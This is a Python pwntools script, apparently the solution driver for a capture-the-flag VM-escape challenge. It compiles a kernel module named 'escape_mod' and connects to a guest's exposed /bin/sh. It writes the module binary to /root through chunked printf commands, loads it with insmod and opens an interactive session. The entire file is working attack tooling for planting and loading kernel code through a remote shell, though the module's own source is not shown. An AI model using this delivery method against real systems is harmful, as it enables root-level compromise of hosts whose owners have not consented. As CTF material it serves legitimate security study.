# Import pwntools
from pwn import *
import os, time
import subprocess
from tqdm import tqdm

# Script to build and transmit kernel module payload to remote guest (as a series of printf commands)
# Most of the actual work is in the module 'escape_mod'

# Challenge information
PORT = 1337
URL = 'localhost'

# Run make to compile kernel module
# This might take a while if it needs to clone the kernel repo
subprocess.run(['make'], stdout=sys.stdout, stderr=sys.stderr, shell=True)

# Start VM and transmit payload
input("Press Enter to start remote...")

p = remote(URL, PORT)

p.recvuntil(b'~ #')

# Transmit payload as series of printf commands

# Remote is netcat to /bin/sh shell, must write binary files using printf "%b" <data> shell commands
def append_payload_cmd(payload_bytes, target_file):
    formatted_payload = ''.join(['\\x{:02x}'.format(b) for b in payload_bytes])
    
    command = f'printf "{formatted_payload}" >> {target_file}'
    
    return command

# Generate list of commands to write payload to file, splitting into chunks of specified size
def save_payload_cmds(payload_path, bytes_per_command=100, guest_path='/root/payload'):

    with open(payload_path, 'rb') as f:
        payload = f.read()
    
    commands = []
    for i in range(0, len(payload), bytes_per_command):
        chunk = payload[i:i + bytes_per_command]
        command = append_payload_cmd(chunk, guest_path)
        commands.append(command)
    
    return commands


guest_path = '/root/escape_mod.ko'
payload_bin = "payload_module/escape_mod.ko"
bytes_per_command = 200
payload_commands = save_payload_cmds(payload_bin, bytes_per_command, guest_path)

input("Press Enter to transmit payload...")

print(f"Transmitting {len(payload_commands)} commands...")
for payload_command in tqdm(payload_commands, desc="Transmitting payload"):
    p.sendline(payload_command.encode())
    p.recvuntil(b'~ #')


# Insert module
input("Press Enter to insert module...")

p.sendline(f'insmod {guest_path}'.encode())

p.interactive()
